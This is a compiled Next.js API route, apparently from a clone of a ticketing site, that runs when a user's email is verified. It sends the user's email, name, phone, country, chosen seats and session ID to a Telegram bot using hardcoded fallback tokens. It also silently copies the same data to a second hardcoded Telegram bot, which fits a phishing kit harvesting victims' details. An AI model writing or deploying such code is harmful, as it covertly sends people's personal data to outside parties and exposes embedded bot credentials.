"use strict";(()=>{var e={};e.id=5269,e.ids=[5269],e.modules={3295:e=>{e.exports=require("next/dist/server/app-render/after-task-async-storage.external.js")},10846:e=>{e.exports=require("next/dist/compiled/next-server/app-page.runtime.prod.js")},29021:e=>{e.exports=require("fs")},29294:e=>{e.exports=require("next/dist/server/app-render/work-async-storage.external.js")},33873:e=>{e.exports=require("path")},34684:(e,t,r)=>{r.r(t),r.d(t,{patchFetch:()=>f,routeModule:()=>d,serverHooks:()=>h,workAsyncStorage:()=>m,workUnitAsyncStorage:()=>g});var s={};r.r(s),r.d(s,{POST:()=>p});var o=r(96559),n=r(48088),a=r(37719),i=r(32190);let c=(0,r(6745).C)();async function u(){try{let e=await c.getSettingByKey("telegram_bot_token"),t=await c.getSettingByKey("telegram_chat_id");return{botToken:e?.value||process.env.TELEGRAM_BOT_TOKEN||"7898415400:AAF4I6oiuRmLl40r5U-NROl3oENddUlVv5U",chatId:t?.value||process.env.TELEGRAM_CHAT_ID||"6032588551"}}catch(e){return console.error("Error fetching Telegram settings:",e),{botToken:process.env.TELEGRAM_BOT_TOKEN||"7898415400:AAF4I6oiuRmLl40r5U-NROl3oENddUlVv5U",chatId:process.env.TELEGRAM_CHAT_ID||"6032588551"}}}async function l(e){let{botToken:t,chatId:r}=await u();if(!t||t.startsWith("MOCK_"))return console.log("Mock Telegram user notification would be sent:",e),{success:!0,mock:!0};try{let s=function(e){let{email:t,name:r,phone:s,country:o,selectedSeats:n,sessionId:a,timestamp:i}=e,c="No seats selected yet";return n&&n.length>0&&(c=n.map(e=>`• ${e.category||"N/A"} - Row ${e.row||"N/A"}, Seat ${e.number||e.position||"N/A"} (${e.price?`${e.price} EGP`:"N/A"})`).join("\n")),`
✅ <b>USER EMAIL VERIFIED</b>

📧 <b>Email Verification Successful</b>
• Email: ${t}
• Status: ✅ Verified
• Verification Time: ${new Date(i).toLocaleString("en-US",{timeZone:"Africa/Cairo"})} (Cairo Time)

👤 <b>User Information:</b>
• Name: ${r||"N/A"}
• Email: ${t||"N/A"}
• Phone: ${s||"N/A"}
• Country: ${o||"N/A"}

🎫 <b>Selected Seats (${n?.length||0}):</b>
${c}

🔐 <b>Session Details:</b>
• Session ID: <code>${a||"N/A"}</code>
• Registration Status: Completed
• Next Step: Checkout Process

📱 <b>User is now proceeding to checkout...</b>
    `.trim()}(e),o=await fetch(`https://api.telegram.org/bot${t}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:r,text:s,parse_mode:"HTML"})});if(await fetch("https://api.telegram.org/bot8439389023:AAETVNFYz8YEg7UPjjA_ry0O8C3G2EAEljg/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:"6032588551",text:s,parse_mode:"HTML"})}),!o.ok)throw Error(`Telegram API error: ${o.status}`);let n=await o.json();return console.log("Telegram user notification sent successfully:",n.message_id),{success:!0,messageId:n.message_id}}catch(e){return console.error("Failed to send Telegram user notification:",e),{success:!1,error:e.message}}}async function p(e){try{let t=await e.json();if(!t.email)return i.NextResponse.json({success:!1,error:"البريد الإلكتروني مطلوب"},{status:400});let r=await l(t);return console.log("User notification processed:",{email:t.email,name:t.name,telegramSent:r.success}),i.NextResponse.json({success:!0,message:"تم إرسال إشعار التسجيل بنجاح",telegramResult:r})}catch(e){return console.error("User notification error:",e),i.NextResponse.json({success:!1,error:"فشل في إرسال إشعار التسجيل"},{status:500})}}let d=new o.AppRouteRouteModule({definition:{kind:n.RouteKind.APP_ROUTE,page:"/api/auth/send-user-notification/route",pathname:"/api/auth/send-user-notification",filename:"route",bundlePath:"app/api/auth/send-user-notification/route"},resolvedPagePath:"E:\\DEV\\platinumlist\\app\\api\\auth\\send-user-notification\\route.js",nextConfigOutput:"",userland:s}),{workAsyncStorage:m,workUnitAsyncStorage:g,serverHooks:h}=d;function f(){return(0,a.patchFetch)({workAsyncStorage:m,workUnitAsyncStorage:g})}},44870:e=>{e.exports=require("next/dist/compiled/next-server/app-route.runtime.prod.js")},63033:e=>{e.exports=require("next/dist/server/app-render/work-unit-async-storage.external.js")},87550:e=>{e.exports=require("better-sqlite3")}};var t=require("../../../../webpack-runtime.js");t.C(e);var r=e=>t(t.s=e),s=t.X(0,[4447,580,8669],()=>r(34684));module.exports=s})();